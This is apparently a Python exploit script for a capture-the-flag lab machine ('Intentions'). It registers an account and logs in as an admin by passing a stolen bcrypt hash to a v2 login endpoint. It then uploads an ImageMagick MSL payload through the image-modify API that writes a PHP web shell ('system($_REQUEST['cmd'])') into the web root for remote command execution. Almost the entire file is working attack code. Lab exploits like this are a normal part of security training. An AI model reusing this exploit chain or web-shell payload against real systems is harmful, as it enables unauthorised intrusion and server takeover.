'''
========= STEPS =========
    1.) Test Login ==> On Fail Register an Account and Log-in
    2.) Capture Cookie and X-XSRF-TOKEN
    3.) Login as an Admin User
    4.) Send RCE Req and Get a Shell
'''

import requests, html

# POST /api/v1/auth/register | 'Content-Type': 'application/json'

registerData = {
    'email':'rce@root.htb',
    'password':'password',
    'name':'rce',
    'password_confirmation':'password'
}

# POST /api/v1/auth/login | 'Content-Type': 'application/json'

loginData = {
    'email':'rce@root.htb',
    'password':'password'
}

# POST /api/v2/auth/login | 'Content-Type': 'application/json'

adminData = {
    'email': 'steve@intentions.htb',
    'hash': '$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa'
}

# POST /api/v2/admin/image/modify | 'Content-Type': 'multipart/form-data; boundary=BOUNDARY'

rce_headers = {
    'Host':'intentions.htb',
    'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept':'application/json, text/plain, */*',
    'Accept-Language':'en-US,en;q=0.5',
    'Accept-Encoding':'gzip, deflate',
    'X-Requested-With':'XMLHttpRequest',
    'Content-Type':'multipart/form-data; boundary=BOUNDARY',
    'Origin':'http://intentions.htb',
    'Connection':'close',
    'Referer':'http://intentions.htb/admin'
}

opening = str(html.escape('&lt;'))
closing = str(html.escape('&gt;'))

# Using the html.escape we can escape the HTML entity, but then later replace 'amp;' with '' to
# Ensure that the payload is written exactly as needed

rce_data = f"""--BOUNDARY
Content-Disposition: form-data; name="path"

vid:msl:/tmp/php*

--BOUNDARY
Content-Disposition: form-data; name="effect"

sepia

--BOUNDARY
Content-Disposition: form-data; name="exploit"; filename="exploit.msl"
Content-Type: text/plain

<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:{opening}?php @system(@$_REQUEST['cmd']); ?{closing}" />
<write filename="info:/var/www/html/intentions/public/rce.php" />
</image>
--BOUNDARY--""".replace("amp;","")

#====================================================================================

def Test_Login(currentSession):
    tReq = currentSession.post('http://intentions.htb/api/v1/auth/login', loginData)
    if "login_error" in tReq.text:
        print("[-] Register Required!")
        RegisterNewAccount(currentSession)
    else:
        print("[+] Logged In as rce@root.htb!")
        LoginAsAdmin(currentSession)

def RegisterNewAccount(currentSession):
    currentSession.post('http://intentions.htb/api/v1/auth/register', registerData)
    Test_Login(currentSession)

def LoginAsAdmin(currentSession):
    adminReq = currentSession.post('http://intentions.htb/api/v2/auth/login', adminData)
    if "login_error" in adminReq.text:
        print("[-] Error With Admin_Data!")
        RegisterNewAccount(currentSession)
    else:
        print("[+] Logged In as steve@intentions.htb!")
        currentSession.get('http://intentions.htb/admin')
        ArbFileWrite(currentSession)

def ArbFileWrite(currentSession):
    #print(rce_data + "\n")

    rceReq = currentSession.post(url='http://intentions.htb/api/v2/admin/image/modify', headers=rce_headers, data=rce_data)
    if rceReq.status_code == 502:
        print("[*] Go to http://intentions.htb/rce.php?cmd=id")
    else:
        print("[-] Error In Request!")

def main():
    Test_Login(requests.Session())
  
if __name__=="__main__":
    main()